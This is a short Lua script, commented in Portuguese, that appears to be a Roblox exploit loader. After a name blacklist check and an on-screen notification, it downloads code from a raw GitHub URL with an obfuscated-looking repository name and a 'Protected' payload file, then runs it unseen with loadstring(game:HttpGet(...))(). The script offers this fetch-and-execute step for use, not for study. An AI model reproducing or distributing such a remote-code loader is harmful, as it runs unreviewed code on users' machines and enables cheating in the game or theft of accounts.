-- Lista negra de nomes que não devem executar o script
local blacklist = {
    "Jogador1",
    "Jogador2",
    "Jogador3"
}

-- Obtém o jogador local
local jogador = game.Players.LocalPlayer

-- Função para verificar se o nome do jogador está na blacklist
local function estaNaBlacklist(nome)
    for _, nomeLista in ipairs(blacklist) do
        if nomeLista == nome then
            return true
        end
    end
    return false
end

-- Função que carrega o script principal
local function carregarScript()
    local url = "https://raw.githubusercontent.com/RASCHHLUBRASCHHLUBRASCHHLUBRASCHHLUBRASCHHLUB/ywhaugwjwvkabakqvkqbajvajqbajHvajabva/refs/heads/main/Protected_1981780099226256.txt"
    local response = game:HttpGet(url, true)
    loadstring(response)()
end

-- Função para exibir uma notificação
local function enviarNotificacao(titulo, texto)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = titulo,
        Text = texto,
        Icon = "" -- Ícone é opcional
    })
end

-- Verifica se o nome do jogador está na blacklist
if estaNaBlacklist(jogador.Name) then
    enviarNotificacao("Blacklist", "Você está na blacklist. O script não será executado.")
else
    enviarNotificacao("Script", "O script está sendo executado.")
    carregarScript()
end
